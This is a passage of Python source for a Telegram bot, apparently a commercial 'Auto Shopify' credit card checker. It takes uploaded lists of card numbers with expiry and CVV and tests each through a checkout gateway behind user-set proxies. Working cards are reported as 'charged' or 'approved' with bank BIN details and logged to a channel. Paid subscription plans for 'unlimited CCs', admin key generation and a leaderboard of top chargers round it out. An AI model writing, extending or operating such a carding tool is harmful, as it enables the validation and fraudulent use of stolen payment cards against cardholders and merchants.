                cards.append(card)
    
    if not cards:
        return await event.reply(f"{WARNING_EMOJI} {bold_text('No valid CCs found!')}", parse_mode='html')
    
    if len(cards) > 20:
        cards = cards[:20]
        await event.reply(f"{WARNING_EMOJI} {bold_text(f'Limiting to first 20 CCs')}", parse_mode='html')
    
    status_msg = await event.reply(f"{CHECK_EMOJI} {bold_text(f'Checking {len(cards)} CCs...')}", parse_mode='html')
    
    proxy_data = await get_user_proxy(event.sender_id)
    proxy = proxy_data['proxy_url'] if proxy_data else None
    
    results = []
    for i, card in enumerate(cards, 1):
        result = await check_card(card, proxy)
        results.append((card, result))
        await status_msg.edit(f"{CHECK_EMOJI} {bold_text(f'Progress:')} {i}/{len(cards)}", parse_mode='html')
    
    await status_msg.delete()
    
    charged_count = sum(1 for _, r in results if r['status'] == 'charged')
    approved_count = sum(1 for _, r in results if r['status'] == 'approved')
    declined_count = sum(1 for _, r in results if r['status'] == 'declined')
    
    summary = f"""{CHECKED_EMOJI} {bold_text('Mass Check Complete!')}

{CHARGED_EMOJI} {bold_text('Charged:')} {charged_count}
{APPROVED_EMOJI} {bold_text('Approved:')} {approved_count}
{DECLINED_EMOJI} {bold_text('Declined:')} {declined_count}
📊 {bold_text('Total:')} {len(cards)}"""
    
    await event.reply(summary, parse_mode='html')
    
    for card, result in results:
        if result['status'] in ['charged', 'approved']:
            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
            
            if result['status'] == 'charged':
                await log_to_channel(event.sender_id, card, result, brand, bin_type, level, bank, country, flag)
                status_display = f"{ORDER_EMOJI} {bold_text('Order Placed!')} {ORDER_EMOJI}"
            else:
                status_display = f"{APPROVED_EMOJI} {bold_text('APPROVED')} {APPROVED_EMOJI}"
            
            msg = f"""{status_display}

{CARD_EMOJI} {bold_text('CC:')} `{card}`
{GATE_EMOJI} {bold_text('Gate:')} {result['gateway']}
{PRICE_EMOJI} {bold_text('Price:')} {result['price']}

{bold_text('BIN Info:')}
• {bold_text('Brand:')} {brand}
• {bold_text('Type:')} {bin_type}
• {bold_text('Level:')} {level}
• {bold_text('Bank:')} {bank}
• {bold_text('Country:')} {country} {flag}"""
            
            await event.reply(msg, parse_mode='html')
            await asyncio.sleep(0.5)


@client.on(events.NewMessage(pattern='/mtxt'))
async def mtxt(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('You are banned!')}", parse_mode='html')
    
    if not event.reply_to_msg_id:
        return await event.reply(f"{WARNING_EMOJI} {bold_text('Reply to a .txt file!')}", parse_mode='html')
    
    replied = await event.get_reply_message()
    if not replied or not replied.document:
        return await event.reply(f"{WARNING_EMOJI} {bold_text('Reply to a .txt file!')}", parse_mode='html')
    
    status_msg = await event.reply(f"{FILE_EMOJI} {bold_text('Downloading file...')}", parse_mode='html')
    
    file_path = await replied.download_media()
    
    try:
        async with aiofiles.open(file_path, "r") as f:
            content = await f.read()
            cards = [line.strip() for line in content.splitlines() if line.strip() and '|' in line]
        os.remove(file_path)
    except Exception as e:
        return await event.reply(f"{DECLINED_EMOJI} {bold_text(f'Error reading file: {e}')}", parse_mode='html')
    
    if not cards:
        return await event.reply(f"{WARNING_EMOJI} {bold_text('No valid CCs found!')}", parse_mode='html')
    
    file_name = replied.document.attributes[0].file_name if replied.document.attributes else "unknown.txt"
    await status_msg.edit(f"{FILE_EMOJI} {bold_text('CC File Detected!')} {FILE_EMOJI}\n\n{bold_text('File:')} {file_name}\n{bold_text('Total CCs:')} {len(cards)}\n\n{CHECK_EMOJI} {bold_text('Starting check...')}", parse_mode='html')
    
    proxy_data = await get_user_proxy(event.sender_id)
    proxy = proxy_data['proxy_url'] if proxy_data else None
    
    charged = approved = declined = 0
    start_time = time.time()
    
    for i, card in enumerate(cards, 1):
        result = await check_card(card, proxy)
        
        if result['status'] == 'charged':
            charged += 1
            await update_user_stats(event.sender_id, 'charged')
            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
            await log_to_channel(event.sender_id, card, result, brand, bin_type, level, bank, country, flag)
        elif result['status'] == 'approved':
            approved += 1
            await update_user_stats(event.sender_id, 'approved')
        else:
            declined += 1
            await update_user_stats(event.sender_id, 'declined')
        
        if i % 10 == 0:
            await status_msg.edit(f"{CHECK_EMOJI} {bold_text('Progress:')} {i}/{len(cards)}\n{CHARGED_EMOJI} {bold_text('Charged:')} {charged}\n{APPROVED_EMOJI} {bold_text('Approved:')} {approved}\n{DECLINED_EMOJI} {bold_text('Declined:')} {declined}", parse_mode='html')
    
    elapsed = time.time() - start_time
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)
    
    sender = await event.get_sender()
    username = f"{sender.first_name} {HEART_EMOJI} {sender.last_name or 'FROXT'}{HEART_EMOJI}" if sender.first_name else "User"
    
    final_msg = f"""{CHECKED_EMOJI} {bold_text('Random File Check Complete!')}

{STAR_EMOJI} {bold_text('Total:')} {len(cards)}
{CHARGED_EMOJI} {bold_text('Charged:')} {charged}
{APPROVED_EMOJI} {bold_text('Approved:')} {approved}
{DECLINED_EMOJI} {bold_text('Declined:')} {declined}
{SKIPPED_EMOJI} {bold_text('Skipped:')} 0
{TIME_EMOJI} {bold_text('Time:')} {minutes}m {seconds}s

{CHECKED_EMOJI} {bold_text('Checked by:')} {username}"""
    
    await status_msg.edit(final_msg, parse_mode='html')


@client.on(events.NewMessage(pattern='/ran'))
async def ran(event):
    await mtxt(event)


@client.on(events.NewMessage(pattern='/proxy'))
async def set_proxy(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('You are banned!')}", parse_mode='html')
    
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) != 2:
        return await event.reply(f"{WARNING_EMOJI} {bold_text('Format:')} `/proxy ip:port:username:password`\n\n{bold_text('Supported: HTTP, HTTPS, SOCKS4, SOCKS5')}", parse_mode='html')
    
    proxy_str = parts[1].strip()
    proxy_data = parse_proxy_format(proxy_str)
    
    if not proxy_data:
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('Invalid proxy format!')}", parse_mode='html')
    
    status_msg = await event.reply(f"{CHECK_EMOJI} {bold_text('Testing proxy...')}", parse_mode='html')
    
    is_working, ip = await test_proxy(proxy_data['proxy_url'])
    
    if not is_working:
        await status_msg.edit(f"{DECLINED_EMOJI} {bold_text('Proxy is not working!')}", parse_mode='html')
        return
    
    await set_user_proxy(event.sender_id, proxy_data)
    
    await status_msg.edit(f"{CHECKED_EMOJI} {bold_text('Proxy set successfully!')}\n\n📍 {bold_text('IP:')} {ip}\n🔒 {bold_text('Type:')} {proxy_data['type'].upper()}\n📡 {bold_text('Proxy:')} {proxy_data['ip']}:{proxy_data['port']}", parse_mode='html')


@client.on(events.NewMessage(pattern='/myproxy'))
async def myproxy(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('You are banned!')}", parse_mode='html')
    
    proxy_data = await get_user_proxy(event.sender_id)
    
    if not proxy_data:
        return await event.reply(f"{WARNING_EMOJI} {bold_text('No proxy set!')}\n\n{bold_text('Use /proxy ip:port:user:pass to add one.')}", parse_mode='html')
    
    message = f"""{PROXY_EMOJI} {bold_text('Current Proxy')}

📍 {bold_text('Address:')} `{proxy_data['ip']}:{proxy_data['port']}`
🔒 {bold_text('Type:')} {proxy_data.get('type', 'http').upper()}
👤 {bold_text('Auth:')} {proxy_data.get('username', 'None')}

{CHECKED_EMOJI} {bold_text('Proxy is active')}"""
    
    await event.reply(message, parse_mode='html')


@client.on(events.NewMessage(pattern='/rmproxy'))
async def rmproxy(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('You are banned!')}", parse_mode='html')
    
    success = await remove_user_proxy(event.sender_id)
    
    if success:
        await event.reply(f"{CHECKED_EMOJI} {bold_text('Proxy removed successfully!')}", parse_mode='html')
    else:
        await event.reply(f"{WARNING_EMOJI} {bold_text('No proxy found to remove!')}", parse_mode='html')


@client.on(events.NewMessage(pattern='/bin'))
async def bin_lookup(event):
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await event.reply(f"{WARNING_EMOJI} {bold_text('Format:')} `/bin 516499`", parse_mode='html')
    
    bin_number = parts[1].strip()[:6]
    
    brand, bin_type, level, bank, country, flag = await get_bin_info(bin_number)
    
    message = f"""{BIN_EMOJI} {bold_text('BIN Lookup Result')}

• {bold_text('BIN:')} {bin_number}
• {bold_text('Brand:')} {brand}
• {bold_text('Type:')} {bin_type}
• {bold_text('Level:')} {level}
• {bold_text('Bank:')} {bank}
• {bold_text('Country:')} {country} {flag}

{STAR_EMOJI} @Atulfroxt73_bot"""
    
    await event.reply(message, parse_mode='html')


@client.on(events.NewMessage(pattern='/redeem'))
async def redeem_key(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('You are banned!')}", parse_mode='html')
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await event.reply(f"{WARNING_EMOJI} {bold_text('Format:')} `/redeem KEY`", parse_mode='html')
    
    key = parts[1].upper()
    keys_data = await load_json(KEYS_FILE)
    
    if key not in keys_data:
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('Invalid key!')}", parse_mode='html')
    
    if keys_data[key]['used']:
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('Key already used!')}", parse_mode='html')
    
    if await is_premium_user(event.sender_id):
        return await event.reply(f"{WARNING_EMOJI} {bold_text('You already have premium!')}", parse_mode='html')
    
    days = keys_data[key]['days']
    await add_premium_user(event.sender_id, days)
    
    keys_data[key]['used'] = True
    keys_data[key]['used_by'] = event.sender_id
    await save_json(KEYS_FILE, keys_data)
    
    await event.reply(f"{REDEEM_EMOJI} {bold_text('Premium Activated!')} {REDEEM_EMOJI}\n\n{CHARGED_EMOJI} {bold_text(f'You have received {days} days of premium access!')}\n\n{STAR_EMOJI} {bold_text('Enjoy unlimited checks!')}", parse_mode='html')


@client.on(events.NewMessage(pattern='/plans'))
async def plans(event):
    message = f"""{PLAN_EMOJI} {bold_text('Premium Plans')} {PLAN_EMOJI}

┌─────────────────────────────────┐
│ 📦 {bold_text('7 DAYS')} - $2              │
│   • 1000 CCs/Day                │
│   • Priority API                │
├─────────────────────────────────┤
│ 📦 {bold_text('30 DAYS')} - $5             │
│   • Unlimited CCs               │
│   • Priority API                │
├─────────────────────────────────┤
│ 📦 {bold_text('90 DAYS')} - $10            │
│   • Unlimited CCs               │
│   • Priority API + VIP Support  │
├─────────────────────────────────┤
│ 👑 {bold_text('LIFETIME')} - $30           │
│   • Everything + Lifetime       │
└─────────────────────────────────┘

{PAYMENT_EMOJI} {bold_text('Payment Methods:')}
{UPI_EMOJI} UPI: `atul0930976-1@okaxis`
{DM_EMOJI} DM: @DARK_FROXT_73

{WARNING_EMOJI} {bold_text('Send screenshot after payment!')}

━━━━━━━━━━━━━━━━━━━━━
{STAR_EMOJI} @Atulfroxt73_bot {STAR_EMOJI}"""
    
    await event.reply(message, parse_mode='html')


@client.on(events.NewMessage(pattern='/refer'))
async def refer(event):
    user_id = event.sender_id
    message = f"""{STAR_EMOJI} {bold_text('Referral System')} {STAR_EMOJI}

{bold_text('Share this link with friends:')}
`https://t.me/AutoShopify_Bot?start=ref_{user_id}`

{bold_text('Rewards:')}
• 5 referrals → 7 days premium
• 10 referrals → 30 days premium
• 20 referrals → Lifetime premium

{CHECKED_EMOJI} {bold_text('Your referrals: 0')}

━━━━━━━━━━━━━━━━━━━━━
{STAR_EMOJI} @Atulfroxt73_bot {STAR_EMOJI}"""
    
    await event.reply(message, parse_mode='html')


@client.on(events.NewMessage(pattern='/auth'))
async def auth_user(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('Admin only!')}", parse_mode='html')
    
    parts = event.raw_text.split()
    if len(parts) != 3:
        return await event.reply(f"{WARNING_EMOJI} {bold_text('Format:')} `/auth user_id days`", parse_mode='html')
    
    try:
        user_id = int(parts[1])
        days = int(parts[2])
        
        await add_premium_user(user_id, days)
        await event.reply(f"{CHECKED_EMOJI} {bold_text(f'Premium granted to {user_id} for {days} days!')}", parse_mode='html')
        
        try:
            await client.send_message(user_id, f"{REDEEM_EMOJI} {bold_text('Premium Activated!')}\n\n{bold_text(f'You have received {days} days of premium access!')}")
        except:
            pass
    except:
        await event.reply(f"{DECLINED_EMOJI} {bold_text('Invalid user ID or days!')}", parse_mode='html')


@client.on(events.NewMessage(pattern='/unauth'))
async def unauth_user(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('Admin only!')}", parse_mode='html')
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await event.reply(f"{WARNING_EMOJI} {bold_text('Format:')} `/unauth user_id`", parse_mode='html')
    
    try:
        user_id = int(parts[1])
        await remove_premium_user(user_id)
        await event.reply(f"{CHECKED_EMOJI} {bold_text(f'Premium removed from {user_id}!')}", parse_mode='html')
    except:
        await event.reply(f"{DECLINED_EMOJI} {bold_text('Invalid user ID!')}", parse_mode='html')


@client.on(events.NewMessage(pattern='/key'))
async def generate_keys(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('Admin only!')}", parse_mode='html')
    
    parts = event.raw_text.split()
    if len(parts) != 3:
        return await event.reply(f"{WARNING_EMOJI} {bold_text('Format:')} `/key count days`", parse_mode='html')
    
    try:
        count = int(parts[1])
        days = int(parts[2])
        
        if count > 20:
            return await event.reply(f"{WARNING_EMOJI} {bold_text('Max 20 keys at once!')}", parse_mode='html')
        
        keys_data = await load_json(KEYS_FILE)
        keys = []
        
        for _ in range(count):
            key = generate_key()
            keys_data[key] = {'days': days, 'used': False, 'created_at': datetime.datetime.now().isoformat()}
            keys.append(key)
        
        await save_json(KEYS_FILE, keys_data)
        
        keys_text = "\n".join([f"{KEY_EMOJI} `{k}`" for k in keys])
        await event.reply(f"{CHECKED_EMOJI} {bold_text(f'Generated {count} keys for {days} days!')}\n\n{keys_text}", parse_mode='html')
    except:
        await event.reply(f"{DECLINED_EMOJI} {bold_text('Invalid input!')}", parse_mode='html')


@client.on(events.NewMessage(pattern='/ban'))
async def ban_user_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('Admin only!')}", parse_mode='html')
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await event.reply(f"{WARNING_EMOJI} {bold_text('Format:')} `/ban user_id`", parse_mode='html')
    
    try:
        user_id = int(parts[1])
        await ban_user(user_id)
        await event.reply(f"{CHECKED_EMOJI} {bold_text(f'User {user_id} banned!')}", parse_mode='html')
    except:
        await event.reply(f"{DECLINED_EMOJI} {bold_text('Invalid user ID!')}", parse_mode='html')


@client.on(events.NewMessage(pattern='/unban'))
async def unban_user_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('Admin only!')}", parse_mode='html')
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await event.reply(f"{WARNING_EMOJI} {bold_text('Format:')} `/unban user_id`", parse_mode='html')
    
    try:
        user_id = int(parts[1])
        await unban_user(user_id)
        await event.reply(f"{CHECKED_EMOJI} {bold_text(f'User {user_id} unbanned!')}", parse_mode='html')
    except:
        await event.reply(f"{DECLINED_EMOJI} {bold_text('Invalid user ID!')}", parse_mode='html')


@client.on(events.NewMessage(pattern='/stats'))
async def bot_stats(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('Admin only!')}", parse_mode='html')
    
    premium = await load_json(PREMIUM_FILE)
    stats = await load_json(STATS_FILE)
    keys = await load_json(KEYS_FILE)
    
    total_users = len(stats)
    total_premium = len(premium)
    total_checked = sum(s['checked'] for s in stats.values())
    total_charged = sum(s['charged'] for s in stats.values())
    total_approved = sum(s['approved'] for s in stats.values())
    
    top_users = sorted(stats.items(), key=lambda x: x[1]['charged'], reverse=True)[:10]
    
    message = f"""{STATS_EMOJI} {bold_text('Bot Statistics')} {STATS_EMOJI}

👤 {bold_text('Users:')} {total_users}
💎 {bold_text('Premium:')} {total_premium}
🔑 {bold_text('Keys Generated:')} {len(keys)}

📊 {bold_text('Global Stats:')}
• {bold_text('Checked:')} {total_checked}
• {bold_text('Charged:')} {total_charged}
• {bold_text('Approved:')} {total_approved}

{LEADERBOARD_EMOJI} {bold_text('Top 10 Leaderboard')}"""
    
    for i, (uid, data) in enumerate(top_users, 1):
        try:
            user = await client.get_entity(int(uid))
            name = user.first_name[:15] if user.first_name else f"User_{uid}"
            username = f"@{user.username}" if user.username else ""
        except:
            name = f"User_{uid[:8]}"
            username = ""
        
        medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"#{i}"
        message += f"\n\n{medal} {bold_text(name)}\n{username}\n{bold_text('Checked:')} {data['checked']}\n{bold_text('Charged:')} {data['charged']}\n{bold_text('Approved:')} {data['approved']}"
    
    message += f"\n\n━━━━━━━━━━━━━━━━━━━━━\n{STAR_EMOJI} @Atulfroxt73_bot {STAR_EMOJI}"
    
    await event.reply(message, parse_mode='html')


@client.on(events.NewMessage(pattern='/broadcast'))
async def broadcast(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('Admin only!')}", parse_mode='html')
    
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) != 2:
        return await event.reply(f"{WARNING_EMOJI} {bold_text('Format:')} `/broadcast message`", parse_mode='html')
    
    message = parts[1]
    stats = await load_json(STATS_FILE)
    
    sent = 0
    failed = 0
    
    status_msg = await event.reply(f"{CHECK_EMOJI} {bold_text(f'Broadcasting to {len(stats)} users...')}", parse_mode='html')
    
    for user_id in stats.keys():
        try:
            await client.send_message(int(user_id), f"{BROADCAST_EMOJI} {bold_text('Announcement')}\n\n{message}")
            sent += 1
        except:
            failed += 1
        
        if (sent + failed) % 10 == 0:
            await status_msg.edit(f"{CHECK_EMOJI} {bold_text('Progress:')} {sent + failed}/{len(stats)}\n✅ {bold_text('Sent:')} {sent}\n❌ {bold_text('Failed:')} {failed}", parse_mode='html')
        
        await asyncio.sleep(0.5)
    
    await status_msg.edit(f"{CHECKED_EMOJI} {bold_text('Broadcast Complete!')}\n\n✅ {bold_text('Sent:')} {sent}\n❌ {bold_text('Failed:')} {failed}", parse_mode='html')


async def log_to_channel(user_id, card, result, brand, bin_type, level, bank, country, flag):
    if not LOG_CHANNEL_ID:
        return
    
    try:
        user = await client.get_entity(user_id)
        username = f"@{user.username}" if user.username else user.first_name
        
        message = f"""{ORDER_EMOJI} {bold_text('Order Placed!')} {ORDER_EMOJI}

{CARD_EMOJI} {bold_text('CC:')} `{card}`
{GATE_EMOJI} {bold_text('Gate:')} {result['gateway']}
{PRICE_EMOJI} {bold_text('Price:')} {result['price']}

{bold_text('BIN Info:')}
• {bold_text('Brand:')} {brand}
• {bold_text('Type:')} {bin_type}
• {bold_text('Level:')} {level}
• {bold_text('Bank:')} {bank}
• {bold_text('Country:')} {country} {flag}

{CHECKED_EMOJI} {bold_text('Checked by:')} {username}

━━━━━━━━━━━━━━━━━━━━━
{STAR_EMOJI} @Atulfroxt73_bot {STAR_EMOJI}"""
        
        await client.send_message(LOG_CHANNEL_ID, message, parse_mode='html')
    except:
        pass


# ============ MAIN ============
async def main():
    print(f"{STAR_EMOJI} {bold_text('Auto Shopify Bot Started!')}")
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
